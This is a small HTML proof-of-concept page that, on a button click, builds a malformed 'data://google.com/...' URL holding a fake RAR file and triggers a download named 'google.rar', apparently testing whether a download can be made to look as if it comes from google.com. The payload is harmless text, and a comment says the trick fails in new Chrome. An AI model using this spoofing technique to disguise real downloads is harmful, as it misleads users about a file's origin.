<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>RAR data:// PoC</title>
</head>
<body>

<button id="start">Start</button>

<script>
document.getElementById('start').addEventListener('click', () => {
  try {
    const content = "Rar!\nFake RAR\nTest\nEND";
    const base64 = btoa(content);

    // malformed URL (tidak akan spoof di Chrome baru)
    const payload = "data://google.com/application/vnd.rar;base64," + base64;

    const a = document.createElement('a');
    a.href = payload;
    a.download = "google.rar";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    console.log("Triggered data://google PoC");

  } catch(e) {
    console.error(e);
  }
});
</script>

</body>
</html>
